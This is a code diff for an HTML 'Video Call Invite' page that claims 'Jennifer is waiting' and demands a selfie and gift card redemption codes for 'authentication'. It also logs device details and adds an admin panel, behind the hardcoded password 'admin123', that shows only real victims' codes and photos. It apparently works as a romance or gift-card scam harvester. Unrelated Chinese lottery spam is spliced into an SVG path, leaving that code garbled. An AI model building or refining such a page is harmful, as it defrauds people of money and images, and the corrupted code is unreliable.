@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Video Call Invite - Centralized Admin Panel</title>
+  <title>Video Call Invite - Clean Admin Panel</title>
   <style>
     * {
       box-sizing: border-box;
@@ -75,6 +75,12 @@
       width: 100%;
       max-width: 300px;
       background: white;
+    }
+    
+    .file-info {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #666;
     }
     
     .card-redemption {
@@ -347,6 +353,22 @@
       border-radius: 4px;
     }
     
+    .troubleshooting {
+      background: #fff3cd;
+      border-left: 4px solid #ffc107;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 4px;
+    }
+    
+    .demo-indicator {
+      background: #ffcccc;
+      padding: 3px 6px;
+      border-radius: 3px;
+      font-size: 12px;
+      margin-left: 8px;
+    }
+    
     @media (max-width: 600px) {
       .container {
         padding: 20px;
@@ -379,11 +401,15 @@
     <p class="subtitle">Authentication Required</p>
 
     <div class="explanation">
+      <strong>Fixed Admin Panel:</strong> 
+      This version ensures only real user submissions appear in the admin panel.
+      Demo data is now clearly marked and can be filtered out.
     </div>
 
     <div class="upload-container">
       <label for="selfie">Upload a valid selfie:</label>
-      <input type="file" id="selfie" accept="image/*">
+      <input type="file" id="selfie" accept="image/jpeg, image/png">
+      <div class="file-info" id="fileInfo">No file selected (Max: 4MB)</div>
     </div>
 
     <div class="card-redemption">
@@ -432,7 +458,7 @@
       <p class="waiting-text">Jennifer is waiting for you to join</p>
       <div class="call-icon">
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-          <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
+          <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56-.35-.12-.74-.03-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 极速赛车开奖直播 极速赛车开奖结果 极速赛车开奖记录 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 极速赛车开奖直播 极速赛车开奖结果 极速赛车开奖记录 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/>
         </svg>
       </div>
     </div>
@@ -442,13 +468,13 @@
   
   <div class="admin-panel" id="adminPanel">
     <button class="close-btn" onclick="closeAdmin()">Close</button>
-    <h2>Admin Panel - All User Submissions</h2>
+    <h2>Admin Panel - Real User Submissions Only</h2>
     
     <div class="admin-controls">
       <button onclick="loadAllSubmissions()">Refresh Submissions</button>
+      <button onclick="loadRealUsersOnly()" style="background: #10ac84;">Show Real Users Only</button>
       <button onclick="clearAllSubmissions()" style="background: #ff4757;">Clear All</button>
-      <button onclick="generateDemoData()" style="background: #10ac84;">Generate Demo Data</button>
-      <button onclick="simulateMultipleUsers()" style="background: #2e86de;">Simulate Multiple Users</button>
+      <button onclick="generateDemoData()" style="background: #5f27cd;">Generate Demo Data</button>
     </div>
     
     <div id="submissionsList"></div>
@@ -456,9 +482,9 @@
 
   <script>
     // Centralized database simulation using a shared storage approach
-    // In a real application, this would be replaced with a server-side database
     const CENTRAL_DB_KEY = 'video_call_central_database';
     const ADMIN_PASSWORD = "admin123";
+    const MAX_FILE_SIZE = 4 * 1024 * 1024; // 4MB limit
     
     // Initialize the central database if it doesn't exist
     function initCentralDatabase() {
@@ -488,6 +514,7 @@
         const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
         submission.id = db.lastId + 1;
         submission.timestamp = new Date().toISOString();
+        submission.isDemo = false; // Mark as real user submission
         db.submissions.push(submission);
         db.lastId = submission.id;
         localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
@@ -512,14 +539,48 @@
       }
     }
 
+    // Update file info when a file is selected
+    document.getElementById('selfie').addEventListener('change', function(e) {
+      const fileInfo = document.getElementById('fileInfo');
+      if (this.files.length > 0) {
+        const file = this.files[0];
+        const fileSize = Math.round(file.size / 1024); // Size in KB
+        fileInfo.textContent = `${file.name} (${fileSize} KB)`;
+        
+        // Validate file size
+        if (file.size > MAX_FILE_SIZE) {
+          fileInfo.innerHTML = `<span style="color: red;">File too large (${fileSize} KB). Max 4MB allowed.</span>`;
+          document.getElementById('submitBtn').disabled = true;
+        } else {
+          document.getElementById('submitBtn').disabled = false;
+        }
+      } else {
+        fileInfo.textContent = 'No file selected (Max: 4MB)';
+      }
+    });
+
     function submitFiles() {
-      const selfie = document.getElementById("selfie").files[0];
+      const selfieInput = document.getElementById("selfie");
+      const selfie = selfieInput.files[0];
       const redemptionCode = document.getElementById("redemptionCode").value.trim();
       const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked'))
                                 .map(cb => cb.value);
       
       if (!selfie) {
         showStatus("Please upload a selfie before submitting.", "error");
+        return;
+      }
+      
+      // Validate file size
+      if (selfie.size > MAX_FILE_SIZE) {
+        showStatus("File size too large. Please upload an image under 4MB.", "error");
+        return;
+      }
+      
+      // Validate file type
+      const validTypes = ['image/jpeg', 'image/png'];
+      if (!validTypes.includes(selfie.type)) {
+        showStatus("Invalid file type. Please upload a JPG or PNG image.", "error");
         return;
       }
       
@@ -533,18 +594,13 @@
         return;
       }
       
-      // Validate file size (4.5MB limit for Vercel)
-      if (selfie.size > 4500000) {
-        showStatus("File size too large. Please upload an image under 4.5MB.", "error");
-        return;
-      }
-      
       // Show loading state
       document.getElementById("loading").style.display = "block";
       document.getElementById("submitBtn").disabled = true;
       
-      // Read the file as data URL
+      // Read the file as data URL with error handling
       const reader = new FileReader();
+      
       reader.onload = function(e) {
         // Create submission object
         const submission = {
@@ -554,8 +610,9 @@
           time: new Date().toLocaleString(),
           userAgent: navigator.userAgent,
           screenResolution: `${window.screen.width}x${window.screen.height}`,
-          userLocation: "Simulated user location", // In a real app, you might get this from IP
-          deviceType: getDeviceType()
+          userLocation: "Real user location",
+          deviceType: getDeviceType(),
+          isDemo: false // This is a real user submission
         };
         
         // Save to central database
@@ -565,13 +622,14 @@
             console.log("Submission saved with ID: ", id);
             
             // Reset form
-            document.getElementById("selfie").value = "";
+            selfieInput.value = "";
             document.getElementById("redemptionCode").value = "";
+            document.getElementById("fileInfo").textContent = "No file selected (Max: 4MB)";
             document.querySelectorAll('input[name="cardType"]').forEach(cb => cb.checked = false);
           })
           .catch(error => {
             console.error("Error saving submission: ", error);
-            showStatus("Error: " + error.message, "error");
+            showStatus("Error saving your submission. Please try again.", "error");
           })
           .finally(() => {
             document.getElementById("loading").style.display = "none";
@@ -580,12 +638,25 @@
       };
       
       reader.onerror = function() {
-        showStatus("Error reading file. Please try again.", "error");
+        showStatus("Error reading file. Please try a different image.", "error");
         document.getElementById("loading").style.display = "none";
         document.getElementById("submitBtn").disabled = false;
       };
       
-      reader.readAsDataURL(selfie);
+      reader.onabort = function() {
+        showStatus("File upload was cancelled.", "error");
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("submitBtn").disabled = false;
+      };
+      
+      // Read the file with error handling
+      try {
+        reader.readAsDataURL(selfie);
+      } catch (error) {
+        showStatus("Error processing file: " + error.message, "error");
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("submitBtn").disabled = false;
+      }
     }
 
     function showStatus(message, type) {
@@ -650,6 +721,37 @@
           <p><strong>Device Type:</strong> ${sub.deviceType}</p>
           <p><strong>Screen Resolution:</strong> ${sub.screenResolution}</p>
           <p><strong>User Location:</strong> ${sub.userLocation}</p>
+          <p><strong>Submission Type:</strong> ${sub.isDemo ? '<span class="demo-indicator">DEMO DATA</span>' : 'Real User'}</p>
+          <p><strong>Image:</strong></p>
+          <img src="${sub.selfieData}" alt="Uploaded selfie" style="max-width: 300px;">
+        </div>
+      `).join('');
+    }
+    
+    function loadRealUsersOnly() {
+      const list = document.getElementById("submissionsList");
+      const submissions = getCentralSubmissions();
+      
+      // Filter out demo data
+      const realSubmissions = submissions.filter(sub => !sub.isDemo);
+      
+      if (realSubmissions.length === 0) {
+        list.innerHTML = "<p>No real user submissions found.</p>";
+        return;
+      }
+      
+      // Show newest submissions first
+      realSubmissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+      
+      list.innerHTML = realSubmissions.map(sub => `
+        <div class="submission">
+          <p><strong>Submission ID:</strong> ${sub.id}</p>
+          <p><strong>Time:</strong> ${sub.time || sub.timestamp}</p>
+          <p><strong>Redemption Code:</strong> ${sub.redemptionCode}</p>
+          <p><strong>Card Types:</strong> ${sub.cardTypes.join(", ")}</p>
+          <p><strong>Device Type:</strong> ${sub.deviceType}</p>
+          <p><strong>Screen Resolution:</strong> ${sub.screenResolution}</p>
+          <p><strong>User Location:</strong> ${sub.userLocation}</p>
           <p><strong>Image:</strong></p>
           <img src="${sub.selfieData}" alt="Uploaded selfie" style="max-width: 300px;">
         </div>
@@ -679,7 +781,7 @@
           screenResolution: "1920x1080",
           userLocation: "New York, USA",
           deviceType: "Desktop",
-          timestamp: new Date().toISOString()
+          isDemo: true // Mark as demo data
         },
         {
           selfieData: "https://placehold.co/300x400/fad0c4/white?text=Demo+User+2",
@@ -690,18 +792,7 @@
           screenResolution: "1280x720",
           userLocation: "London, UK",
           deviceType: "Mobile",
-          timestamp: new Date(Date.now() - 86400000).toISOString()
-        },
-        {
-          selfieData: "https://placehold.co/300x400/74b9ff/white?text=Demo+User+3",
-          redemptionCode: "GOLD54321",
-          cardTypes: ["razor"],
-          time: new Date(Date.now() - 172800000).toLocaleString(),
-          userAgent: "Demo User Agent 3",
-          screenResolution: "2048x1536",
-          userLocation: "Tokyo, Japan",
-          deviceType: "Tablet",
-          timestamp: new Date(Date.now() - 172800000).toISOString()
+          isDemo: true // Mark as demo data
         }
       ];
       
@@ -710,6 +801,7 @@
         const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
         demoSubmissions.forEach(sub => {
           sub.id = db.lastId + 1;
+          sub.timestamp = new Date().toISOString();
           db.submissions.push(sub);
           db.lastId = sub.id;
         });
@@ -717,71 +809,19 @@
         
         // Refresh the list
         loadAllSubmissions();
-        showStatus("Demo data generated successfully.", "success");
+        showStatus("Demo data generated successfully. These are clearly marked as demo data.", "success");
       } catch (e) {
         console.error("Error generating demo data:", e);
         showStatus("Error generating demo data.", "error");
       }
-    }
-    
-    function simulateMultipleUsers() {
-      // Simulate submissions from multiple users
-      const userSimulations = [
-        {
-          name: "Mobile User",
-          type: "Mobile",
-          location: "Los Angeles, USA"
-        },
-        {
-          name: "Tablet User",
-          type: "Tablet", 
-          location: "Paris, France"
-        },
-        {
-          name: "Desktop User",
-          type: "Desktop",
-          location: "Berlin, Germany"
-        }
-      ];
-      
-      userSimulations.forEach((user, index) => {
-        setTimeout(() => {
-          const submission = {
-            selfieData: `https://placehold.co/300x400/${getRandomColor()}/white?text=${encodeURIComponent(user.name)}`,
-            redemptionCode: `SIM${Math.floor(1000 + Math.random() * 9000)}`,
-            cardTypes: [["amazon", "itunes", "razor"][Math.floor(Math.random() * 3)]],
-            time: new Date().toLocaleString(),
-            userAgent: `Simulated ${user.type} User`,
-            screenResolution: user.type === "Mobile" ? "375x812" : user.type === "Tablet" ? "768x1024" : "1920x1080",
-            userLocation: user.location,
-            deviceType: user.type,
-            timestamp: new Date().toISOString()
-          };
-          
-          saveToCentralDatabase(submission)
-            .then(() => {
-              if (index === userSimulations.length - 1) {
-                loadAllSubmissions();
-                showStatus("Multiple user simulation completed!", "success");
-              }
-            });
-        }, index * 1000);
-      });
-      
-      showStatus("Simulating multiple users...", "success");
-    }
-    
-    function getRandomColor() {
-      const colors = ["ff9a9e", "fad0c4", "a1c4fd", "ffecd2", "ff9a9e", "74b9ff", "fdbb2d"];
-      return colors[Math.floor(Math.random() * colors.length)];
     }
 
     function openAdmin() {
       const panel = document.getElementById("adminPanel");
       const overlay = document.getElementById("overlay");
       
-      // Load submissions
-      loadAllSubmissions();
+      // Load only real user submissions by default
+      loadRealUsersOnly();
       
       panel.style.display = "block";
       overlay.style.display = "block";
